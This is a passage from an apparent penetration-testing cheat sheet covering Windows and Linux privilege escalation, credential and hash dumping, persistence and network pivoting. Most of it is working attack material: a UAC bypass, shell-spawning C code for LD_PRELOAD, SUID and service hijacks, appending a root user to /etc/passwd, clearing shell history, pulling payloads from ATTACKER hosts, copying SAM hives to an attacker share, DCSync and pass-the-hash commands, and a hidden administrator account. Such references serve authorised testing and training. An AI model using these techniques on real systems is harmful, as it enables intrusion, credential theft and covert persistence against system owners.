New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper

# To undo:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

## 5.6. Windows Pass-The-Hash

See [Dumping Hashes from Windows](#735-dumping-hashes-from-windows) for techniques
on grabbing Windows password hashes.

```sh
# spawn cmd.exe shell on remote windows box
# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
```

## 5.7. Windows Token Impersonation

These require the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to
be enabled. This is the case when you have a shell running as
"nt authority\local service"

### 5.7.1. Windows Token Impersonation with RoguePotato

```sh
# on kali box, set up socat redirector for roguepotato to bounce off of
sudo socat tcp-listen:135,reuseaddr,fork tcp:WINBOX_IP:9999
# also start another netcat listener to catch the system shell
sudo nc -vlnp 443
```

```bat
:: in windows reverse shell with "SeImpersonatePrivilege"
:: or "SeAssignPrimaryTokenPrivilege" enabled
RoguePotato.exe -r KALI_IP -e "C:\Users\Public\revshell.exe" -l 9999
:: and bingo! you should have system on the listener you set up!
```

### 5.7.2. Windows Token Impersonation with PrintSpoofer

First set up a netcat listener on Kali to catch the reverse shell.

```bat
:: on windows reverse shell with "SeImpersonatePrivilege"
:: or "SeAssignPrimaryTokenPrivilege" enabled
PrintSpoofer.exe -c "C:\Users\Public\revshell.exe" -i
```

### 5.7.3. Windows Service Escalation - Registry

Vulnerable when:

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# shows NT AUTHORITY\INTERACTIVE has FullControl
```

`windows_service.c`:
```c
// compile with:
// x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run()
{
    system("whoami > c:\\temp\\service.txt");
    return 0;
}

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv)
{
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler);
    Run();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request)
{
    switch(request)
    {
        case SERVICE_CONTROL_STOP:
			ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus (hStatus,  &ServiceStatus);
    return;
}
```

Compile with `x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe`, then
upload winsvc.exe to C:\Temp.

```bat
:: overwrite regsvc execution path
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\winsvc.exe /f
:: restart regsvc
sc start regsvc
```

## 5.8. Compiling Windows Binaries on Linux

You can use `mingw` to compile C files.

[MonoDevelop](https://www.monodevelop.com/download/) is a cross-platform IDE
for C# and .NET.

## 5.9. Miscellaneous Windows Commands

```bat
:: restart the machine now
shutdown /r /t 0

:: run regedit as SYSTEM (to view protected keys)
psexec.exe -i -s regedit.exe
:: check out HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon\

:: recursively list files with Alternate Data Streams
dir /s /r | find ":$DATA"
gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}

:: Check if OS is 64-bit
(wmic os get OSArchitecture)[2]

:: Set terminal to display ansi-colors
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
powershell Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1
```

```powershell
# determine if current powershell process is 64-bit
[System.Environment]::Is64BitProcess

# determine if OS is 64-bit (various methods)
[System.Environment]::Is64BitOperatingSystem
(Get-WMIObject Win32_OperatingSystem).OSArchitecture
(Get-WMIObject CIM_OperatingSystem).OSArchitecture
(Get-WMIObject Win32_Processor).AddressWidth
[System.IntPtr]::Size  # 4 = 32-bit, 8 = 64-bit

# Base64 Decode
[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("BASE64STRING"))
```

# 6. Linux Privilege Escalation

## 6.1. Basic Linux Post-Exploit Enumeration

```sh
# unset history (shell command logging)
export HISTFILE=
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
export HISTCONTROL=ignorespace
history -c

# make sure terminal environment is good, if not working right
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
export TERM=xterm-256color

# current user
id
whoami

# system hostname
hostname -f
cat /etc/hostname

# OS Version info
uname -a
cat /etc/*release
cat /etc/issue

# check sudo permissions
sudo -l

# Credentials
ls -l /home/*/.ssh/id*  # ssh keys
ls -AlR /home/*/.gnupg  # PGP keys
ls -l /tmp/krb5*  # Kerberos tickets

# list all users, groups
cat /etc/passwd
cat /etc/group
cat /etc/master.passwd
cat /etc/shadow  # need to be root, get list of hashed passwords
# pretty print relevant data
grep -v '#' /etc/passwd | awk -F: 'BEGIN{print "USERNAME PASSWD UID GID HOMEDIR SHELL"; print "-------- ------ --- --- ------- -----"} {print $1 " " $2 " " $3 " " $4 " " $6 " " $7}' | column -t

# Currently signed in users
w
who -a

# Recently signed in users
last  # better info running as root, may need "-a" switch

# mounted filesystems
mount
cat /etc/fstab
cat /etc/auto?master

# check this user's cron jobs
crontab -l
# check for running cron jobs
grep "CRON" /var/log/cron.log
# look at system-wide crontab
cat /etc/crontab
# pay attention to PATH in /etc/crontab and any bad file perms of scripts

# list every user's cron jobs
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null

# find all SUID and SGID binaries
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# Get SELinux status
getenforce

# running processes
ps aux

# shell history
cat /home/*/.*history
grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null


###############################
## NETWORK  ###################
###############################

# IP addresses, interfaces
ip a
ifconfig -a
cat /etc/network/interfaces

# Routing info
ip r
route -n
netstat -r

# arp table
arp -a

# DNS resolver info
cat /etc/resolv.conf

# resolved hosts
cat /etc/hosts

# Network connections
netstat -tulnp  # listening ports
netstat -anop  # all connection types
lsof -ni  # established connections
cat /proc/net/*  # lots of output??

# iptables rules (must be root)
iptables -L -v -n
iptables -t nat -L -v -n  # NAT info
iptables-save  # saved iptables


##################################
## Software  #####################
##################################

# Info on installed packages
rpm -qa --last  # RedHat
yum list | grep installed  # CentOS/RedHat w/ Yum
apt list --installed  # Debain w/ Apt
dpkg -l  # Debian
pkg_info  # xBSD
pkginfo  # Solaris
ls -d /var/db/pkg/  # Gentoo
pacman -Q  # Arch
cat /etc/apt/sources.list  # Apt sources
ls -l /etc/yum.repos.d/  # Yum repos
cat /etc/yum.conf  # Yum config

# check version info of useful binaries
gcc -v  # compiler
ldd --version  # glibc version
python --version
python3 --version
perl -v
php -v
ruby -v
node -v
mysql --version

# See if other useful GTFO-bins are present
which awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip


####################################
## Miscellaneous  ##################
####################################

# kernel system messages since boot
dmesg

# processor and memory info
cat /proc/cpuinfo
cat /proc/meminfo

# Message of the Day
cat /etc/motd
```

## 6.2. Watching for Linux Process Changes

```sh
#!/bin/bash
# source: Ippsec nineveh walkthrough

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

## 6.3. Adding root user to /etc/shadow or /etc/passwd

```sh
# if /etc/shadow is writable
# generate new password
mkpasswd -m sha-512 newpassword
# edit /etc/shadow and overwrite hash of root with this one

# if /etc/passwd is writable
echo "root2:$(mkpasswd -m sha-512 newpassword):0:0:root:/root:/bin/bash" >> /etc/passwd
# alternatively
echo "root2:$(openssl passwd newpassword):0:0:root:/root:/bin/bash" >> /etc/passwd
# can also add generated password between the first and second colon of root user
```

## 6.4. Escalating via sudo binaries

Many binaries let you run commands from within them. If you get limited `sudo`
permissions for one of the binaries, you can escalate to root.

```sh
# check for sudo permissions
sudo -l
# if you see a binary with '(root) NOPASSWD ...' you might be in luck
# check the following website for escalation methods:
# https://gtfobins.github.io/#+sudo

# Example: awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Example: find
sudo find . -exec /bin/sh \; -quit
```

## 6.5. LD_PRELOAD and LD_LIBRARY_PATH

For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
are inherited from the user's environment:
```
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

`preload.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	// setresuid(0,0,0);
  setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

`library_path.c`:
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
  exit(0);
}
```

Usage:

```sh
# LD_PRELOAD
# compile malicious preload binary
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# use it to get root
sudo LD_PRELOAD=/tmp/preload.so program_name_here

# LD_LIBRARY_PATH
# see which shared libraries are used
ldd $(which apache2)
# compile malicious library as one of existing ones
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
# use it to get root
sudo LD_LIBRARY_PATH=/tmp apache2
# note, some ld-files work better than others, so try every option from ldd
# if the first attempt fails. May also need to alter file to hook function
# being called (must exactly match function signature)
```

## 6.6. SUID binaries

`inject.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

```sh
# find all SUID and GUID binaries
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# look for access to file that doesn't exist, but we might control
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

# compile your inject file
gcc -shared -fPIC inject.c -o /path/to/hijacked.so

# run your binary
suid-so
```

You can also hijack system(3) calls in an executable where the binary path isn't
specified (PATH hijack). Look for clues using `strings` and `strace`, then replace
the binary in question with your own:

`hijack.c`
```c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

And invoke like so:
```sh
# compile
gcc hijack.c -o hijacked-binary-name

# inject onto PATH
PATH=.:$PATH victim-binary
```

In `bash` versions less than 4.2-048, you can even do PATH hijacks by exporting
functions that look like valid paths, and will get executed instead of the
binary at the real path:

```sh
# create a substitute for /usr/sbin/service
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
# then just run victim binary that executes /usr/sbin/service
```

For bash versions less than 4.4, you can also take advantage of the PS4 env var,
which is used to display debug information (debug mode when SHELLOPTS=xtrace).

```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

## 6.7. Using NFS for Privilege Escalation

NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
something owned by root remotely is owned by root locally.

```sh
# check for NFS with root-squashing disabled (no_root_squash)
cat /etc/exports

# On Kali box:
sudo su   # switch to root
mkdir /tmp/nfs
mount -o rw,vers=2 VICTIM_IP:/share_name /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# on victim machine
/tmp/shell.elf
```

# 7. Loot

## 7.1. Upgrading to Interactive Shell

Use this if you have a netcat-based reverse shell (on Linux box).

```sh
# In reverse shell ##########
python3 'import pty; pty.spawn("/bin/bash")'

# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell

# In local shell ##########
# Get TTY rows/cols for later:
stty size # prints "rows cols"
# ignore hotkeys in the local shell and get back to remote shell
stty raw -echo; fg # hit enter TWICE after this

# In reverse shell ##########
# set correct size for remote shell (ROWS and COLS from stty size)
stty rows ROWS cols COLS
# enable terminal colors
export TERM=xterm-256color
# reload bash to apply TERM env var
exec /bin/bash
```

## 7.2. File Transfers

### 7.2.1. Netcat transfer

```sh
# start listening for download on port 9001
nc -nlvp 9001 > dump.txt
# upload file to IP via port 9001
nc $IP 9001 < file.txt
```

### 7.2.2. Curl transfers

```sh
# upload a file with curl (POST multipart/form-data)
# replace key1, upload with appropriate form fields
curl -v -F key1=value1 -F upload=@localfilename URL
```

### 7.2.3. PowerShell File Transfers

```powershell
# Download to Windows victim
invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
# For PowerShell version < 3.0
(net.webclient).downloadstring("http://ATTACKER/shell.ps1") > c:\users\public\shell.ps1
(net.webclient).downloadfile("http://ATTACKER/shell.ps1", "c:\users\public\shell.ps1")
```

### 7.2.4. Mount NFS Share

```sh
mount -t nfs -o vers=3 10.1.1.1:/home/ /mnt/nfs-share
```

### 7.2.5. SMB Share

Mounting/hosting share on Kali
```sh
# mount foreign SMB share on Kali
sudo mount -t cifs -o vers=1.0 //10.11.1.136/'Sharename' /mnt/smbshare

# host SMB share on kali (note: 'share' is share name)
sudo impacket-smbserver share .
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save
```

Using curl to upload file to windows SMB share
```sh
curl --upload-file /path/to/rsh.exe -u 'DOMAIN\username' smb://VICTIM_IP/c$/
```

Get all files from SMB share with `smbclient`:
```sh
smbclient //VICTIM_IP/SHARENAME
> RECURSE ON
> PROMPT OFF
> mget *
```

### 7.2.6. FTP Server on Kali

```sh
# install pyftpdlib for root to use port 21
sudo pip install pyftpdlib
# get usage help
python3 -m pyftpdlib --help
# start server on port 21, allowing anonymous write
sudo python3 -m pyftpdlib -p 21 -w
# start server on port 2121 for specific username/password
python3 -m pyftpdlib -w -u hacker -P g0tPwned
```

Then on Windows box, create `ftpup.bat`:
```bat
@echo off
:: change server IP and Port as required
echo open LISTEN_IP 2121> ftpcmd.dat
echo user hacker>> ftpcmd.dat
echo g0tPwned>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat
```

And use like so:

```bat
ftpup.bat filetotxfer.txt
```

Node.js ftps-server:
```sh
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:2121 --root /tmp
```

Pure-FTP server:
```sh
# Install
sudo apt update && sudo apt install -y pure-ftp
# Configure pure-ftp
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### 7.2.7. Windows LOLBAS File Downloads

```bat
:: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe

:: Download using expand
expand http://7-zip.org/a/7z1604-x64.exe 7zip.exe
:: Download from SBM share into Alternate Data Stream
expand \\badguy\evil.exe C:\Users\Public\somefile.txt:evil_ads.exe

:: Download using powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','7zip.exe')"
powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
```

### 7.2.8. Windows Files of Interest

```bat
:: containing plaintext, encoded, or hashed credentials
%SYSTEMDRIVE%\unattend.txt
%SYSTEMDRIVE%\sysprep.inf
%SYSTEMDRIVE%\sysprep\sysprep.xml
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
```

## 7.3. Grabbing Passwords

Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)

### 7.3.1. Finding Windows Passwords

```bat
:: search specific filetypes for "password"
findstr /si password *.txt|*.xml|*.ini|*.config

:: Searching all files (lots of output)
findstr /spin "password" *.*

:: find files that might have credentials in them
dir c:\ /s *pass* == *cred* == *vnc.ini == *.config* == Groups.xml == sysprep.* == Unattend.*
```

### 7.3.2. Windows Passwords in Registry
```bat
:: Windows autologin credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

:: VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

:: SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

:: Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

:: Search for password in registry
reg query HKLM /f password /t REG_SZ /s | clip
reg query HKCU /f password /t REG_SZ /s | clip
```

### 7.3.3. Files with Passwords on Windows

Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
an AES-encrypted password, but the static key is published on the MSDN website.

```text
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
%WINDIR%\SYSVOL\Groups.xml
```

To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`

### 7.3.4. Getting Saved Wifi Passwords on Windows

```bat
:: show all saved wifi networks
netsh wlan show profiles

:: get password of specific network 'profilename'
wlan show profile profilename key=clear

:: PEAP wifi network passwords are stored in registry
reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv

:: Display all keys, values and data under the PEAP profiles:
reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
```

### 7.3.5. Dumping Hashes from Windows

```bat
:: Grab them from the registry
reg save hklm\sam .\sam.save
reg save hklm\system .\system.save
reg save hklm\security .\security.save

:: Grab the backups from disk
copy %WINDIR%\repair\sam \\ATTACKER_IP\share\sam.save
copy %WINDIR%\repair\system \\ATTACKER_IP\share\system.save
```

Then, on attack box:
```sh
# using impacket secretsdump.py (security.save optional)
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

#### 7.3.5.1. Dumping Hashes from Windows Domain Controller

DCSync Attack

```sh
# requires authentication
impacket-secretsdump DOMAIN/username:Password@DC_IP_or_FQDN -just-dc-ntlm | tee dc-hashes.txt
```

### 7.3.6. Pass The Hash Attacks on Windows

```sh
# Get remote powershell shell by passing the hash
# install: sudo gem install evil-winrm
evil-winrm.rb -i VICTIM_IP -u username -H NTLM_HASH

# Run remote command (note colon before NTLM hash)
psexec.py -hashes :0e0363213e37b94221497260b0bcb4fc administrator@VICTIM_IP whoami

# other options: xfreerdp, crackmapexec, pth-winexe
```

# 8. Windows Persistence

## 8.1. Add RDP User

```bat
net user hacker P@$$w0rd /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
:: delete user
net user hacker /del
```

## 8.2. Change Windows Domain Credentials

If you want to change the password of a user on a windows domain:

```powershell
Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
```

# 9. Linux Persistence

TODO

# 10. Pivoting and Redirection

These are techniques for "traffic bending" or "traffic shaping" or
"tunneling traffic" or "port redirection" or "port forwarding".

## 10.1. SSH Tunnels

Before starting, it is best to have the following settings enabled in your
`/etc/ssh/sshd_config` file.

```ini
# Specifies that remote hosts are allowed to connect to local forwarded ports.
GatewayPorts yes

# Allow TCP forwarding (local and remote)
AllowTcpForwarding yes
```

Here are common tunneling commands (using `-g` flag forces the ssh option
`GatewayPorts` to yes, and is good practice when using `-R/-L/-D`):

```sh
## Local Forwarding ###################################
# SSH local port forward to reach internal_server_ip:port via jumpbox_ip
ssh tunneler@jumpbox_ip -p 2222 -gL 4445:internal_server_ip:445
# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip

# SSH local port forward to send traffic from our local port 4445 to victim's
# port 445 (to get around firewall restrictions that don't allow remote
# connections to that port, but allow us to ssh in)
ssh victim@victim_ip -gL 8080:localhost:80
# Now `curl localhost:8080` will fetch victim_ip:80 which is not reachable
# from the outside

## Remote Forwarding #################################
# forward traffic to redirector's port 80 to your local listener on port 8080
ssh redirector@jumpbox_ip -gR 80:localhost:8080
# now reverse shells pointed to the jumpbox_ip:80 will hit your local listener

# Connecting from jumpbox->attacker to give attacker access to
# internal_server_ip:445
ssh attacker@attacker_ip -gR 4445:internal_server_ip:445
# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip, getting around
# firewall rules that also prevent inbound ssh connections

## Dynamic forwarding (SOCKS5) #######################
# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
ssh tunneler@server_ip -p 2222 -gD 1080
# next config proxychains socks5 localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only

# to proxy DNS through the new SSH SOCKS tunnel, set the following line in
# /etc/proxychains4.conf:
proxy_dns
# and set the following env variable:
export PROXYRESOLVE_DNS=REMOTE_DNS_SVR

## ProxyJump ########################################
# ProxyJump lets you nest ssh connections to reach remote internal networks/hosts
# ProxyJump ssh to an internal_host via ssh server_ip
ssh -J tunneler@server_ip:2222 remoteuser@internal_host # which is only accessible from server_ip

# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
ssh -J firstuser@1st_box:2222 seconduser@2nd_box -gD 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only

## Miscellaneous ###################################
# bypass first time prompt when have non-interactive shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
```

When using ProxyJump, it is easier to use if you set up `ssh_config`
appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464)
for how to do it.

You can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See
[here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling)
for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).

**PRO TIP**: If setting up a remote ssh tunnel to forward web traffic, use the
following flags: `-fNTgR`.

- `-f` forks the command into the background after
connection is established so you can keep using the terminal.
- `-N` and `-T` say "No" commands can be executed and no "TTY" is allocated.
  Using these together prevents command execution on the remote host (jump box)
- `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding

## 10.2. Bending with iptables

Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
host to your desired remote host. Note, it's usually also good practice to
specify the interface for iptables rules with `-i eth0` or whatever.

```sh
# allow inbound traffic on tcp port 80
sudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
# NAT the traffic from server's port 80 to remote host port 80 (changing dest addr)
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTE_HOST_IP:80
# enable NAT'ing on outbound traffic (changing source addr)
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
# allow forwarding traffic through iptables
sudo iptables -I FORWARD -j ACCEPT
# default policy to allow forwarding
sudo iptables -P FORWARD ACCEPT
# Enable ip forwarding in kernel permanently (fwding req'd for MASQUERADE/SNAT)
sudo sysctl -w net.ipv4.ip_forward=1
# -- or temporarily until reboot --
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# make iptables rules persistent (optional)
sudo service iptables-persistent save
```

## 10.3. Bending with socat

On the jump-box:

```sh
# basic port forwarding with socat listener
sudo socat TCP4-LISTEN:80,fork TCP4:REMOTE_HOST_IP:80
# optionally, do same thing bound to specific interface IP
socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:REMOTE_HOST_IP:80
```

## 10.4. Bending with rinetd

Once installed, you can easily specify rinetd forwarding rules by changing the
config settings in `/etc/rinetd.conf`.

Redirection rules are in the following format:

```
bindaddress bindport connectaddress connectport
```

The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its
configuration file without interrupting existing connections. Under Linux
the process id is saved in the file `/var/run/rinetd.pid` to facilitate the
`kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.

## 10.5. Bending with netsh

If you own a dual-homed internal Windows box that you want to pivot from, you
can set up port forwarding using the `netsh` utility.

```bat
:: NOTE: before you start, make sure IP Helper service is running

:: establish IPv4 port forwarding from windows external IP to internal host
netsh interface portproxy add v4tov4 listenport=4445 listenaddress=WIN_EXT_IP connectport=445 connectaddress=INTERNAL_VICTIM_IP

:: you also need to open a firewall rule to allow your inbound 4445 traffic
netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
```